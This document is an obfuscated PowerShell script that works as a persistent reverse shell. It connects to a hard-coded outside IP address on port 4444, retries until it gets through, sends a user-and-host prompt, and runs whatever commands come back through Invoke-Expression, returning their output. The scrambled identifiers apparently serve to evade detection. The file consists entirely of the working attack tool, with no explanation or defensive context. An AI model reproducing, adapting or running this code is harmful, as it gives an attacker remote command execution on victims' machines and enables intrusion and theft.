class ZKmRIVFipPYRFGNvAn {
    
    [string]$CTjRhRqzSuqlVJgcpgSk = "93.49.240.195"
    [int]$DRkvWjGqxNyVFC = 4444

    $DpBCCfwRcjrQeiyFHsP
    $ZJMVJdfDKOhNq
    $JxgDx
    $XTkwQjuSpuuThVZAUbbbAAE
    $jwkjaMuaHqGvnXSDLEMI
    $hBaJTJ
    [int]$WmvEz = 50*1024

    uQtRcDdEAMRhFySsXV() {
        $this.ZJMVJdfDKOhNq = $false
        while ($true) {
            try {
                $this.ZJMVJdfDKOhNq = New-Object Net.Sockets.TcpClient($this.CTjRhRqzSuqlVJgcpgSk, $this.DRkvWjGqxNyVFC)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.MxPlcHkWLHZpCKp()
    }

    MxPlcHkWLHZpCKp() {
        $this.DpBCCfwRcjrQeiyFHsP = $this.ZJMVJdfDKOhNq.GetStream()
        $this.XTkwQjuSpuuThVZAUbbbAAE = New-Object Byte[] $this.WmvEz
        $this.hBaJTJ = New-Object Text.UTF8Encoding
        $this.JxgDx = New-Object IO.StreamWriter($this.DpBCCfwRcjrQeiyFHsP, [Text.Encoding]::UTF8, $this.WmvEz)
        $this.jwkjaMuaHqGvnXSDLEMI = New-Object System.IO.StreamReader($this.DpBCCfwRcjrQeiyFHsP)
        $this.JxgDx.AutoFlush = $true
    }

    sztGWkeVdOhclEc() {
        $this.uQtRcDdEAMRhFySsXV()
        $this.RYkepxEzKbvga()
    }

    TbizoUocOFO($GzNASgbTFFKzRNnYSQaCrO) {
        try {
            [byte[]]$JFMxVvywMw = [text.Encoding]::Ascii.GetBytes($GzNASgbTFFKzRNnYSQaCrO)
            $this.JxgDx.Write($JFMxVvywMw, 0, $JFMxVvywMw.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.sztGWkeVdOhclEc()
        }
    }

    [string] vBbtCFVDSOAngwFzbNeWZU() {
        try {
            $AyVuTsbjRJTZ = $this.DpBCCfwRcjrQeiyFHsP.Read($this.XTkwQjuSpuuThVZAUbbbAAE, 0, $this.WmvEz)    
            $ldGVr = ($this.hBaJTJ.GetString($this.XTkwQjuSpuuThVZAUbbbAAE, 0, $AyVuTsbjRJTZ))
            return $ldGVr
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.sztGWkeVdOhclEc()
            return ""
        }
    }

    [string] xkHQrFeY($oJvKWszSrCzgQNRKAwwxMk) {
        Write-Host $oJvKWszSrCzgQNRKAwwxMk
        try { 
            $OBIeOeC = Invoke-Expression $oJvKWszSrCzgQNRKAwwxMk | Out-String
        }
        catch {
            $dAhDHmyYqhXMP = $_.Exception
            $hFZVATybNBgURhEqA = $_.Message
            $OBIeOeC = "`n$_`n"
        }
        return $OBIeOeC
    }

    [string] DBnbszaEsawLNumRkacSSZ() {
        $GqvJidPUh = [Environment]::UserName
        $VMMOdXbbWDBd = [System.Net.Dns]::GetHostName()
        $NruRVdFCSIWJotRid = Get-Location
        return "$GqvJidPUh@$VMMOdXbbWDBd [$NruRVdFCSIWJotRid]~$ "
    }

    RYkepxEzKbvga() {
        while ($this.ZJMVJdfDKOhNq.Connected) {
            $this.TbizoUocOFO($this.DBnbszaEsawLNumRkacSSZ())         
            $ldGVr = $this.vBbtCFVDSOAngwFzbNeWZU()
            $OBIeOeC = "`n"
            if ([string]::IsNullOrEmpty($ldGVr)) {
                continue
            }
            $OBIeOeC = $this.xkHQrFeY($ldGVr)
            $this.TbizoUocOFO($OBIeOeC + "`n")
            $this.DpBCCfwRcjrQeiyFHsP.Flush()
        }
        $this.ZJMVJdfDKOhNq.Close()
        $this.sztGWkeVdOhclEc()
    } 
}

$DmplsFQQ = [ZKmRIVFipPYRFGNvAn]::new()
$DmplsFQQ.sztGWkeVdOhclEc()
